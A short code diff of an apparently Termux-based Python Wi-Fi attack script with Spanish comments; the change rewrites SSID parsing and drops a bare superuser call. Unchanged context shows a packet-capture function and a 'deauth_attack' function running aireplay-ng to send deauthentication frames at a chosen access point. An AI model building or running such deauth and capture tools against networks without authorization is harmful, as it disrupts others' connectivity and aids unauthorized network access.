@@ -14,8 +14,12 @@ def run_command(command):
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
     print("Escaneando redes Wi-Fi...")
-    resultado = run_command("tsu -c 'iw dev wlan0 scan | grep SSID'")
-    redes = [line.split(":")[1].strip() for line in resultado.split("\n") if line]
+    resultado = run_command("tsu -c 'iw dev wlan0 scan'")
+    redes = []
+    for linea in resultado.split('\n'):
+        if "SSID" in linea:
+            essid = linea.split(':')[1].strip()
+            redes.append(essid)
     return redes
 
 def capturar_paquetes(bssid, channel):
@@ -29,9 +33,6 @@ def deauth_attack(bssid):
     run_command(f"tsu -c 'aireplay-ng --deauth 10 -a {bssid} wlan0'")
 
 def main():
-    # Asegurarse de tener permisos de superusuario
-    run_command("tsu")
-    
     # Escanear redes Wi-Fi
     redes = scan_wifi()
     if redes:
